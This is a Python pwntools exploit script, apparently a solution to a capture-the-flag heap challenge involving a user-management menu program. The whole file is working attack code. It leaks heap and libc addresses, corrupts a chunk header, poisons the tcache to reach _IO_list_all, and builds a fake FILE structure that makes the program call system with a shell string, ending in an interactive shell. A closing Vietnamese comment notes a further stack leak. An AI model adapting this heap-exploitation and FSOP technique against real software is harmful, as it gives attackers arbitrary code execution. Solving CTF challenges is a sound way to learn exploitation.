#!/usr/bin/python3 
from pwn import * 

exe = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe 

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GBD():
	gdb.attach(p, gdbscript='''
		b* _IO_wdoallocbuf
		b* _IO_wfile_overflow
		c
		''')	

if args.REMOTE:
	HOST = 0
	PORT = 0
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def add_user(name, addr, bio):
	sla(b'Choice: ', b'1')
	sa(b'Name: ', name)
	sa(b'Address: ', addr)
	sa(b'Bio: ', bio)
def edit_bio(idx, new_bio):
	sla(b'Choice: ', b'2')
	slan(b'Index: ', idx)
	sa(b'New Bio: ', new_bio)
def delete_user(idx):
	sla(b'Choice: ', b'3')
	slan(b'Index: ', idx)
def print_user(idx):
	sla(b'Choice: ', b'4')
	slan(b'Index: ', idx)

#GBD()
input("Stage 1: Leak Heap & Leak Libc")
add_user(b'k' * 0x20, b'k' * 0x40, b'k' * 256)
print_user(0)
ru(b'k' * 0x60)
heap_base = leak(r(6), 0x310)
info("Heap Base: ", heap_base)
for _ in range(6):
	add_user(b'k', b'k', b'k' * 256)
add_user(b'k', b'k', b'k')
add_user(b'k', b'k', b'k' * 256)
add_user(b'k', b'k', b'k' * 256)
for x in range(7): # 0 -> 6 = 7
	delete_user(x)
delete_user(8) #overflow
delete_user(9)
edit_bio(7, b'A' * 0x20)
print_user(7)
ru(b'A' * 0x20)
libc.address = leak(r(6), 0x203b20)
info("Libc Base: ",libc.address)
edit_bio(7, b'\x00' * 0x18 + p64(0x181))
input("Stage 2: FSOP | Fake _IO_list_all")
target = ((heap_base + 0xdd0) >> 12) ^ (libc.sym._IO_list_all)
pld = b'\x01\x01;sh;\x00\x00'
pld = pld.ljust(0x28, b'\x00') + p64(1) #write_base > write_ptr
pld = pld.ljust(0x88, b'\x00') + p64(libc.sym._IO_2_1_stdout_ - 0x50)
pld = pld.ljust(0xa0, b'\x00') + p64(heap_base + 0xcf8 - 0xe0)
pld = pld.ljust(0xd8, b'\x00') + p64(libc.sym._IO_wfile_jumps)
pld += p64(libc.sym.system) + p64(heap_base + 0xcf0 - 0x68)
add_user(b'k0', b'k0', b'A' * 256)
add_user(b'k1', b'k1', b'k1')
add_user(b'k2', b'k2', b'k2')
add_user(b'k3', b'k3', b'k3')
delete_user(3)
delete_user(2)
edit_bio(1, b'\x00' * 0x18 + p64(0x21) + p64(target))
add_user(b'k4', b'k4', b'k4')
add_user(b'k5', b'k5', p64(heap_base + 0xc10))
edit_bio(0, pld)
sla(b'Choice: ', b'5')
p.interactive()
# có thể leak địa chỉ stack trên heap (do s chưa clear trước khi được strdup nên có copy cả giá trị stack trên heap vào)
